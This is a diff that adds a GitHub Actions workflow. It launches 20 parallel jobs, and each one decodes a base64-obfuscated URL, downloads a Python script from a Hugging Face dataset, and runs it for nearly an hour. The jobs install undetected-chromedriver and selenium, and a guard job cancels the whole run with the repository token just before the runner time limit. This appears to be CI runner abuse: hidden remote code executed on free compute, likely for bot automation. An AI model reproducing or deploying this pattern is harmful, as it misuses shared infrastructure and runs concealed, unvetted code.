@@ -1,0 +1,103 @@
+name: Cobalt Phantom Mesh
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: cobalt-mesh-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Cobalt Guard: waits 59 minutes then aborts the entire run
+  # =================================================================
+  cobalt-guard:
+    name: "Cobalt Guard"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      GUARD_SPAN: 3540
+    steps:
+      - name: Raise Guard
+        run: |
+          echo "[GUARD] Guard raised for run: ${{ github.run_id }}"
+          echo "[GUARD] Standing by for ${GUARD_SPAN} seconds before the 59-minute meridian."
+
+          sleep "${GUARD_SPAN}"
+
+          echo "[GUARD] Meridian reached — sending abort signal."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[GUARD] Abort signal sent. All active and pending jobs will be stopped."
+
+  # =================================================================
+  # Phantom Mesh: parallel mesh worker nodes
+  # =================================================================
+  phantom-mesh:
+    name: "MeshNode-${{ matrix.node_key }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_key: [X7A, K3B, M9C, Q2D, R5E, T8F, W1G, Z4H, B6J, D0K, F3L, H7M, J2N, L5P, N8Q, P1R, S4T, V6W, Y9X, C0Z]
+
+    steps:
+      # #################################################################
+      # Phase 1: Prepare the runner
+      # #################################################################
+      - name: Prepare Runner
+        run: |
+          echo "[PREP] Preparing MeshNode-${{ matrix.node_key }} on the runner..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # #################################################################
+      # Phase 2: Retrieve the phantom worker
+      # #################################################################
+      - name: Retrieve Phantom Worker
+        run: |
+          echo "[RETRIEVE] Pulling phantom worker from remote source..."
+          WORKER_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$WORKER_URL" -o phantom_worker.py
+          echo "[RETRIEVE] Phantom worker saved locally."
+
+      # #################################################################
+      # Phase 3: Provision runtime libraries
+      # #################################################################
+      - name: Provision Libraries
+        run: |
+          echo "[LIBS] Provisioning runtime libraries..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # #################################################################
+      # Phase 4: Spawn the phantom worker (3540s ceiling)
+      # #################################################################
+      - name: Spawn Phantom Worker
+        run: |
+          echo ">> Spawning MeshNode-${{ matrix.node_key }} worker..."
+
+          python3 phantom_worker.py &
+          WORKER_PID=$!
+
+          echo ">> Worker spawned. Maximum lifetime: 3540 seconds."
+
+          sleep 3540
+
+          if kill -0 "$WORKER_PID" 2>/dev/null; then
+            echo ">> Lifetime ceiling hit — shutting worker down."
+            kill -9 "$WORKER_PID"
+            echo ">> Worker shut down by the lifetime controller."
+          else
+            echo ">> Worker exited before the lifetime ceiling."
+          fi
